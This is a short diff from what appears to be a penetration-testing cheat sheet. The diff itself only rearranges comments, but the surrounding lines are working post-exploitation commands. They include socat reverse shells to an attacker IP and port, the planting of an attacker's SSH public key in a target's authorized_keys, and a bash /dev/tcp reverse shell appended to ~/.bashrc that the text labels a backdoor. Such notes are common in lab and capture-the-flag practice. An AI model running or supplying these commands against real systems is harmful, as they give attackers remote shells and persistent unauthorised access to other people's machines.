@@ -19,9 +19,11 @@ socat TCP:<local-ip>:<local-port> EXEC:powershell.exe,pipes # in our system for 
 
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane # in target system
 -----------------
+# in target
 mkdir -p ~/.ssh/
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbox86Ufk mobin@solcoteh' >> ~/.ssh/authorized_keys # in target
-ssh user@10.10.10.10 -i id_rsa  # in our system 
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbox86Ufk mobin@solcoteh' >> ~/.ssh/authorized_keys 
+# in our system 
+ssh user@10.10.10.10 -i id_rsa  
 -----------------
 echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> ~/.bashrc # backdoor in target
 -----------------
